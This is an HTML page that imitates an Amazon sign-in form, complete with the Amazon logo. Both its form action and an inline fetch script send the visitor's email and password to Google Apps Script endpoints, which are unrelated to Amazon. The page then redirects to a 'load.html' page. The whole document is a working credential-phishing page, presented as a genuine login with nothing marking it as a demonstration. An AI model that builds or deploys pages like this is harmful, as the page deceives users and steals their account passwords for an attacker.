<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SignIn A/C</title>
  <link rel="stylesheet" href="mystyle.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/5.1.0/mdb.min.css" rel="stylesheet">
</head>
<body>

  <div class="form-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">

    <h2 style="text-align: left;">Sign In</h2>
    <form id="signInForm" action="https://script.google.com/macros/s/AKfycbyKGjzQrPobxP-TdeIoXH_bJUoXllA4foxEPGz9H4k/dev" method="POST"> 
      <!-- Email input -->
      <div data-mdb-input-init class="form-outline"> 
        <label class="form-label" for="form2Example1">Email address</label>
        <input name="email" type="email" id="form2Example1" class="form-control" placeholder="Email address" required />
      </div>

      <!-- Password input -->
      <div data-mdb-input-init class="form-outline">
        <label class="form-label" for="form2Example2">Password</label>
        <input name="password" type="password" id="form2Example2" class="form-control" placeholder="Password" required />
      </div>
      
      <!-- Submit button -->
      <button type="submit" class="btn btn-primary mb-4" id="signInBtn" value="Submit">Sign in</button>

      <div class="row mb-4">
        <div class="col d-flex justify-content-center">
          <div class="form-check">
            <input class="form-check-input" type="checkbox" value="" id="form2Example31" checked />
            <label class="form-check-label" for="form2Example31"> Remember me </label>
          </div>
        </div>

        <div class="col">
          <a href="#!">Forgot password?</a>
        </div>
      </div>

      <div class="text-center">
        <p>Not a member? <a href="#!">Register</a></p>
        <p>or sign up with:</p>
        <div class="social-btns">
          <button type="button" class="btn btn-link btn-floating mx-1">
            <i class="fa fa-facebook"></i>
          </button>

          <button type="button" class="btn btn-link btn-floating mx-1">
            <i class="fa fa-google-plus"></i>
          </button>

          <button type="button" class="btn btn-link btn-floating mx-1">
            <i class="fa fa-flickr"></i>
          </button>

          <button type="button" class="btn btn-link btn-floating mx-1">
            <i class="fa fa-instagram"></i>
          </button>
        </div>
      </div>
    </form>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/5.1.0/mdb.min.js"></script>

  <script>
    document.getElementById("signInForm").addEventListener("submit", function(event) {
      event.preventDefault();  // Prevent the default form submission

      var email = document.getElementById("form2Example1").value;
      var password = document.getElementById("form2Example2").value;

      if (email && password) {
        // Send the form data to Google Apps Script using fetch API
        fetch("https://script.google.com/macros/s/AKfycbzlIn4oW9ZQL7df6FNeHmc7qyU8lUyExZ5xTto_ri-ziE1f9WwCE_Ok6zE1GJTiq2rZ/exec", {
          method: "POST",
          body: new URLSearchParams({
            email: email,
            password: password
          }),
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          }
        })
        .then(response => response.text())
        .then(result => {
          console.log("Form data submitted successfully: ", result);
          // Redirect after successful submission
          window.location.href = 'load.html'; // Replace this with your desired redirect page
        })
        .catch(error => {
          console.error("Error submitting form data: ", error);
          alert("There was an error with the sign-in process.");
        });
      } else {
        alert("Please fill in both email and password.");
      }
    });
  </script>

  
</body>
</html>
